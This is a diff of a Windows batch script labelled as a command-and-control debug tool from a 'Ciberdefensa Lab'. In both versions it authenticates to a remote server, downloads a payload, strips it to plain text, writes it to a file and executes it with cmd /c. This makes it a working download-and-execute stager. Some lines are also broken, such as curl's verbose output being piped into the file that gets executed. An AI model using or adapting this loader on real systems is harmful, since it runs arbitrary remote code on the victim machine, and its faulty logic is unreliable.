@@ -1,13 +1,13 @@
 @echo off
 setlocal EnableDelayedExpansion
 chcp 65001 >nul
-title C2 VERBOSE.DEBUG.MAX - API→RAW→HEX→CLEAN→PRINT→EXEC
-color 0E
+title C2 VERBOSE.DEBUG.FAILSAFE - API→RAW→HEX→CLEAN→PRINT→EXEC
+color 0C
 
 echo.
 echo ╔══════════════════════════════════════════════════════════════════════╗
-echo ║  🕵️‍♂️  C2 VERBOSE.DEBUG.MAX - COMPLETE TRACE 🕵️‍♂️                        ║
-echo ║  Alex Montilla - Ciberdefensa Lab vDEBUG.MAX                           ║
+echo ║  🕵️‍♂️  C2 VERBOSE.DEBUG.FAILSAFE - ERROR PROOF 🕵️‍♂️                      ║
+echo ║  Alex Montilla - Ciberdefensa Lab vFAILSAFE                            ║
 echo ╚══════════════════════════════════════════════════════════════════════╝
 echo.
 
@@ -19,126 +19,158 @@ set "LOG=%TEMP%\c2_debug.log"
 set "AUTH=%TEMP%\auth.json"
 
 echo 📁 DEBUG FILES:
-echo    AUTH:   %AUTH%
-echo    RAW:    %RAW%
-echo    CLEAN:  %CLEAN%
-echo    EXEC:   %FILE%
-echo    LOG:    %LOG%
+echo    AUTH: %AUTH%
+echo    RAW:  %RAW%
+echo    CLEAN:%CLEAN%
+echo    LOG:  %LOG%
 echo.
 
 echo =====================================================
-echo 🔍 [1/8] API AUTH - nonce + token
+echo 🔍 [1/8] API HEALTH CHECK
 echo =====================================================
-echo 📡 REQUEST → %BASE%/auth/key
-curl -s --max-time 10 "%BASE%/auth/key" > "%AUTH%"
-echo 📄 RESPONSE SIZE:
+echo 📡 TESTING %BASE%/health
+curl -s --max-time 5 "%BASE%/health" > "%TEMP%\health.txt"
+set /p HEALTH=<"%TEMP%\health.txt"
+echo ✓ HEALTH: %HEALTH%
+type "%TEMP%\health.txt"
+del "%TEMP%\health.txt" 2>nul
+echo.
+
+echo =====================================================
+echo 🔍 [2/8] API AUTH - RAW RESPONSE
+echo =====================================================
+echo 📡 GET %BASE%/auth/key
+curl -v --max-time 10 "%BASE%/auth/key" > "%AUTH%" 2>&1
+echo 📄 AUTH SIZE:
 for %%F in ("%AUTH%") do echo    %%~zF bytes
 
-echo 📄 RAW JSON:
+if not exist "%AUTH%" (
+    echo ❌ ERROR: auth.json NO CREADO
+    pause
+    exit /b 1
+)
+
+echo 📄 RAW AUTH JSON:
 type "%AUTH%"
 echo.
 
 echo =====================================================
-echo 🔍 [2/8] JSON PARSE - nonce + token
+echo 🔍 [3/8] JSON PARSE - nonce + token
 echo =====================================================
 powershell -NoProfile -Command ^
-  "(Get-Content '%AUTH%' | ConvertFrom-Json).nonce" > "%TEMP%\nonce.txt"
-powershell -NoProfile -Command ^
-  "(Get-Content '%AUTH%' | ConvertFrom-Json).token" > "%TEMP%\token.txt"
+  "try { $json = Get-Content '%AUTH%' -Raw | ConvertFrom-Json; ^
+  $json.nonce | Out-File '%TEMP%\nonce.txt' -Encoding ASCII; ^
+  $json.token | Out-File '%TEMP%\token.txt' -Encoding ASCII; ^
+  Write-Host '✓ JSON PARSED OK' } ^
+  catch { Write-Host '❌ JSON PARSE ERROR:' $_.Exception.Message }"
+
+if not exist "%TEMP%\nonce.txt" (
+    echo ❌ ERROR: NONCE no extraído
+    pause
+    exit /b 1
+)
+
+if not exist "%TEMP%\token.txt" (
+    echo ❌ ERROR: TOKEN no extraído
+    pause
+    exit /b 1
+)
 
 set /p NONCE=<"%TEMP%\nonce.txt"
 set /p TOKEN=<"%TEMP%\token.txt"
-
 echo ✓ NONCE:  %NONCE%
-echo ✓ TOKEN:  %TOKEN%[!TOKEN:~0,44!]
+echo ✓ TOKEN:  %TOKEN:~0,44%
 echo.
 
 echo =====================================================
-echo 🔍 [3/8] DOWNLOAD RAW PAYLOAD
+echo 🔍 [4/8] DOWNLOAD RAW PAYLOAD - VERBOSE
 echo =====================================================
-echo 📡 REQUEST → %BASE%/payload/encrypted
+echo 📡 POST %BASE%/payload/encrypted
 echo 🔑 HEADERS:
 echo    X-Nonce: %NONCE%
-echo    X-Token: %TOKEN%
-curl -s --max-time 10 ^
+echo    X-Token: %TOKEN:~0,44%
+
+curl -v --max-time 10 ^
   -H "X-Nonce: %NONCE%" ^
   -H "X-Token: %TOKEN%" ^
-  "%BASE%/payload/encrypted" > "%RAW%"
+  "%BASE%/payload/encrypted" > "%RAW%" 2>&1
 
-echo ✓ RAW SIZE:
-for %%F in ("%RAW%") do echo    %%~zF bytes
+echo 📄 RAW SIZE:
+if exist "%RAW%" (
+    for %%F in ("%RAW%") do echo    %%~zF bytes
+) else (
+    echo ❌ ERROR: RAW file NO creado
+    type "%RAW%"
+    pause
+    exit /b 1
+)
+
+echo 📄 CURL VERBOSE LOG:
+type "%RAW%"
 echo.
 
 echo =====================================================
-echo 🔍 [4/8] HEX DUMP - PRIMEROS 128 BYTES
+echo 🔍 [5/8] HEX DUMP - PRIMEROS 128 BYTES
 echo =====================================================
 powershell -NoProfile -Command ^
-  "$bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
+  "if(Test-Path '%RAW%') { ^
+  $bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
+  Write-Host 'HEX DUMP:'; ^
   0..127 | ForEach-Object { if($_ -lt $bytes.Length) { '{0:X2} ' -f $bytes[$_] } else { '..' } } | ^
-  Out-Host -Width 200"
+  Out-Host } else { Write-Host '❌ RAW file missing' }"
+
 echo.
 
 echo =====================================================
-echo 🔍 [5/8] ASCII DUMP - CONTENIDO LEGIBLE
+echo 🧹 [6/8] LIMPIEZA + IMPRIMIR CONTENIDO
 echo =====================================================
 powershell -NoProfile -Command ^
-  "$bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
-  $text = $bytes | Where-Object {$_ -ge 32 -and $_ -le 126} | ForEach-Object {[char]$_}; ^
-  [System.Text.Encoding]::ASCII.GetString($text.ToArray())"
-echo.
-
-echo =====================================================
-echo 🧹 [6/8] LIMPIEZA AUTOMÁTICA (BOM + INVISIBLES)
-echo =====================================================
-powershell -NoProfile -Command ^
-  "$bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
-  # Skip BOM (FF FE, EF BB BF, etc) ^
+  "if(Test-Path '%RAW%') { ^
+  $bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
   $start = 0; ^
   if($bytes.Count -gt 1 -and $bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) { $start = 2 }; ^
   if($bytes.Count -gt 2 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) { $start = 3 }; ^
-  # Clean visible ASCII only ^
   $cleanBytes = $bytes[$start..($bytes.Count-1)] | Where-Object { $_ -ge 32 -and $_ -le 126 }; ^
   $content = [System.Text.Encoding]::ASCII.GetString($cleanBytes); ^
   $content | Out-File '%CLEAN%' -Encoding ASCII; ^
   Write-Host ('✓ CLEAN SIZE: ' + $content.Length + ' chars'); ^
-  Write-Host '📄 CONTENIDO FINAL LIMPIO:'; ^
-  Write-Host $content"
+  Write-Host '📄 CONTENIDO EXTRAÍDO:'; ^
+  Write-Host $content } else { Write-Host '❌ Cannot clean - RAW missing' }"
+
+if exist "%CLEAN%" (
+    echo 📄 FINAL FILE:
+    type "%CLEAN%"
+) else (
+    echo ❌ ERROR: CLEAN file NO creado
+    pause
+)
 
 echo.
-echo =====================================================
-echo 📄 [7/8] CONTENIDO FINAL EN ARCHIVO
-echo =====================================================
-echo CONTENIDO %CLEAN%:
-type "%CLEAN%"
-echo.
 
 echo =====================================================
-echo 🚀 [8/8] EJECUCIÓN MÚLTIPLE + LOG
+echo 🚀 [7/8] EJECUCIÓN CON LOG
 echo =====================================================
-echo 🔥 TEST 1: call directo
-echo --- SALIDA DIRECTA ---
-call "%CLEAN%" 2>nul
-echo --- FIN TEST 1 ---
-
-echo 🔥 TEST 2: cmd /c con log completo
-cmd /c "%CLEAN%" > "%LOG%" 2>&1
-echo --- SALIDA LOG ---
-type "%LOG%"
-echo --- FIN TEST 2 ---
+if exist "%CLEAN%" (
+    echo 🔥 EXECUTING...
+    cmd /c "%CLEAN%" > "%LOG%" 2>&1
+    echo 📄 EXEC LOG:
+    type "%LOG%"
+) else (
+    echo ❌ SKIP EXEC - no clean file
+)
 
 echo.
+
 echo =====================================================
-echo ✅ RESUMEN FINAL
+echo ✅ [8/8] RESUMEN FINAL
 echo =====================================================
-echo AUTH SIZE:  for %%F in ("%AUTH%") do echo    %%~zF bytes
-echo RAW SIZE:   for %%F in ("%RAW%") do echo    %%~zF bytes
-echo CLEAN SIZE: for %%F in ("%CLEAN%") do echo    %%~zF bytes
-echo LOG:        %LOG%
+echo HEALTH: %HEALTH%
+echo NONCE:  %NONCE%
+echo TOKEN:  %TOKEN:~0,44%
+echo RAW:    for %%F in ("%RAW%") do if exist "%%F" (echo %%~zF bytes) else (echo MISSING)
+echo CLEAN:  for %%F in ("%CLEAN%") do if exist "%%F" (echo %%~zF bytes) else (echo MISSING)
+echo LOG:    %LOG%
 echo.
 
-echo 🔥 PRESIONA CUALQUIER TECLA PARA REPLAY
-pause >nul
-
-echo 🔥 REPLAY EXEC...
-call "%CLEAN%"
+del "%TEMP%\nonce.txt" "%TEMP%\token.txt" 2>nul
 pause
